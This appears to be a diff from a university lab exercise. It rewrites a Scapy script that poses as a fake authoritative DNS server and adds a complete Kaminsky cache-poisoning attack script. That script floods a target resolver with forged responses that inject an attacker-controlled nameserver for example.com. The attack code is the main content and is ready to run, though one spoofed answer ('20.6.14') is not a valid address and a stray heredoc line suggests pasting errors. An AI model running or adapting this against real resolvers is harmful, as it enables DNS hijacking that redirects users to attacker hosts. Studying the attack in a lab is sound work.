@@ -1,51 +1,79 @@
 #!/usr/bin/env python3
 from scapy.all import *
-import time
 
 def dns_handler(pkt):
     if pkt.haslayer(DNSQR):
         qname = pkt[DNSQR].qname.decode()
-        print(f"[*] Received DNS query for {qname} from {pkt[IP].src}")
-    
+        print(f"Query: {qname} from {pkt[IP].src}")
+        
         if 'ns.hust-cse.net' in qname:
-            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-                   UDP(dport=pkt[UDP].sport, sport=53) / \
-                   DNS(id=pkt[DNS].id, qr=1, aa=1, 
-                       qd=pkt[DNS].qd,
-                       an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, rdata='10.10.27.4'))
+            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, rdata='10.10.27.4'))
             send(resp, verbose=0)
-            print(f"[+] Responded: ns.hust-cse.net -> 10.10.27.4")
-
-        elif 'example.com' in qname and pkt[DNSQR].qtype == 1:
-            if qname.strip('.') == 'example.com':
-                resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-                       UDP(dport=pkt[UDP].sport, sport=53) / \
-                       DNS(id=pkt[DNS].id, qr=1, aa=1,
-                           qd=pkt[DNS].qd,
-                           an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, rdata='20.6.14'))
-                send(resp, verbose=0)
-                print(f"[+] Responded: example.com -> 20.6.14")
-            
-            else:
-                resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-                       UDP(dport=pkt[UDP].sport, sport=53) / \
-                       DNS(id=pkt[DNS].id, qr=1, aa=1,
-                           qd=pkt[DNS].qd,
-                           an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, rdata='20.23.3.19'))
-                send(resp, verbose=0)
-                print(f"[+] Responded: {qname} -> 20.23.3.19")
-
+        
+        elif qname.strip('.') == 'example.com' and pkt[DNSQR].qtype == 1:
+            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, rdata='20.6.14'))
+            send(resp, verbose=0)
+        
+        elif '.example.com' in qname and pkt[DNSQR].qtype == 1:
+            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, rdata='20.23.3.19'))
+            send(resp, verbose=0)
+        
         elif 'example.com' in qname and pkt[DNSQR].qtype == 2:
-            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-                   UDP(dport=pkt[UDP].sport, sport=53) / \
-                   DNS(id=pkt[DNS].id, qr=1, aa=1,
-                       qd=pkt[DNS].qd,
-                       an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, type='NS', rdata='ns.hust-cse.net'),
-                       ar=DNSRR(rrname='ns.hust-cse.net', ttl=600, rdata='10.10.27.4'))
+            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, type='NS', rdata='ns.hust-cse.net'), ar=DNSRR(rrname='ns.hust-cse.net', ttl=600, rdata='10.10.27.4'))
             send(resp, verbose=0)
-            print(f"[+] Responded: example.com NS -> ns.hust-cse.net")
 
-print("[*] Starting fake DNS server on 10.10.27.4:53...")
-print("[*] Ready to handle DNS queries...")
-
+print("Starting fake DNS server...")
 sniff(filter="udp port 53 and host 10.10.27.4", prn=dns_handler, store=0)
+EOF
+
+# 创建 kaminsky_attack.py
+cat > kaminsky_attack.py << 'EOF'
+#!/usr/bin/env python3
+from scapy.all import *
+import random
+import string
+import time
+
+target_dns = "10.10.27.2"
+attacker_ip = "10.10.27.4"
+fake_auth_ip = "199.43.135.53"
+
+def random_subdomain():
+    return ''.join(random.choices(string.ascii_lowercase, k=10))
+
+def attack_once():
+    subdomain = random_subdomain()
+    query_name = f"{subdomain}.example.com"
+    dns_id = random.randint(1, 65535)
+    src_port = random.randint(30000, 60000)
+    
+    print(f"Attack: {query_name} (ID: {dns_id})")
+    
+    query_pkt = IP(dst=target_dns, src=attacker_ip)/UDP(sport=src_port, dport=53)/DNS(id=dns_id, rd=1, qd=DNSQR(qname=query_name, qtype="A"))
+    send(query_pkt, verbose=0)
+    
+    forged_pkt = IP(src=fake_auth_ip, dst=target_dns)/UDP(sport=53, dport=src_port)/DNS(
+        id=dns_id, qr=1, aa=1, rd=0,
+        qd=DNSQR(qname=query_name, qtype="A"),
+        an=DNSRR(rrname=query_name, ttl=600, rdata="20.23.3.19"),
+        ns=DNSRR(rrname="example.com", ttl=600, type="NS", rdata="ns.hust-cse.net"),
+        ar=DNSRR(rrname="ns.hust-cse.net", ttl=600, rdata="10.10.27.4")
+    )
+    send(forged_pkt, verbose=0)
+
+def main():
+    print("Starting Kaminsky attack...")
+    count = 0
+    
+    while count < 100:
+        for i in range(20):
+            attack_once()
+            time.sleep(0.01)
+        
+        count += 1
+        print(f"Batch {count} completed")
+        time.sleep(0.5)
+
+if __name__ == "__main__":
+    main()
+EOF
